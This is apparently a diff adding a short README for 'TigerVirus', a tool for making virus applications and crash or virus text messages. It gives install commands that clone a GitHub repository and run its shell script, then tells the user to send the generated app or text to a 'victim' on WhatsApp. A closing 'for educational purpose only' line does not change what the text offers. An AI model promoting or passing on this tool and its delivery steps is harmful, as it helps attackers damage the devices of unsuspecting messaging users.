@@ -1,0 +1,18 @@
+Best Virus Applications and VIRUS message Making Tool
+
+INSTALLATION
+
+apt update && apt upgrade
+pkg install git -y
+git clone https://github.com/Devil-Tigers/TigerVirus.git
+cd TigerVirus
+bash TigerVirus.sh
+
+
+After Installation the Virus Applications or text file Send To Victim If Application
+
+copy and past on whatsapp and sent if Text
+
+Enjoy
+
+FOR EDUCATIONAL PURPOSE ONLY
